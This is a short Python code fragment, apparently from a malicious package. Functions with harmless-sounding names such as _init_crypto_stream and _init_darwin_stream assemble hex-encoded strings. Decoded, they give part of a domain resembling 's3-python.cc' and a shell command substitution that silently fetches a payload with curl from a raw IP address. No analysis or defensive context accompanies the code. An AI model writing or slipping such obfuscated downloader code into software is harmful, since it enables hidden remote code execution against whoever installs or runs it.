...
def _init_crypto_stream():
    ...
    _p9 = bytes.fromhex('7333')
    _p10 = bytes.fromhex('2d70')
    _p11 = bytes.fromhex('7974')
    _p12 = bytes.fromhex('686f')
    _p13 = bytes.fromhex('6e2e6363')
...
def _init_darwin_stream():
    ...
    _d3 = bytes.fromhex('24286375726c202d6673534c20687474703a2f2f3137362e36352e3133322e39362f4a6977756e61766f7429')
    return _d1.decode('utf-8'), _d2.decode('utf-8'), _d3.decode('utf-8')
